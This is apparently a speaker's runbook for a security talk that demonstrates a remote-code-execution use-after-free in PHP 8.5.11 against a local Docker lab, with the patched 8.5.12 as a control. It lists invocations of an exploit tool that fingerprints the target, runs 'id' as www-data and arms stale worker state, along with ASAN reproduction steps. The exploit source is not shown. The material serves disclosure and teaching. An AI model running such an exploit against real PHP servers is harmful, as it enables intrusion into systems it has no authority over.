# Demo runbook

Rule: **every demo must run reproducibly in under 60 seconds**, and every one has a backup
recording. If it fails live, move to the recording without commenting on the failure on stage.

## Before going on stage

```bash
cd lab && docker compose down -v && docker compose up -d
docker compose ps
curl -s http://127.0.0.1:8511/           # "ok"
curl -s http://127.0.0.1:8512/           # "ok"  (8.5.12, control)
python exploit/php2shell.py fingerprint --url http://127.0.0.1:8511
```

Checklist:
- [ ] Docker running, images already pulled (no pulling on stage)
- [ ] Terminal with a large font, no scrollback containing personal paths
- [ ] `gdb` and ASAN ready if used
- [ ] Captures of every stage saved under `research/captures/<date>/`
- [ ] 8.5.12 target available for "and now the same request against the patch?" — that
      contrast is the strongest teaching moment in the talk

## Demo 1 — 30 seconds of impact

```bash
python exploit/php2shell.py run --url http://127.0.0.1:8511 --cmd 'id'
```
Expected: the command runs with the worker's UID (`www-data`).

If it fails → cut to the recording and continue with "what you just saw".

## Demo 2 — The dirty worker

```bash
python exploit/php2shell.py arm   --url http://127.0.0.1:8511 --strategy session
python exploit/php2shell.py probe --url http://127.0.0.1:8511
```
Expected: stale-state signals (fatal/OOM in the producer, consumption in the probe).

## Demo 3 — ASAN

```bash
docker compose --profile asan up -d victim-asan
docker compose logs -f victim-asan
```
Expected: `heap-use-after-free` with a stack pointing at the consumer path.

## Demo 4 — The patch

Repeat the same command against 8512. Expected: fixed version, no consumption, no crash.

## Plan B

Recordings under `research/captures/demo/`:
`demo1.mp4` (RCE), `demo2.mp4` (dirty worker), `demo3.mp4` (ASAN), `demo4.mp4` (patch).

## Afterwards

```bash
cd lab && docker compose --profile asan down -v
```
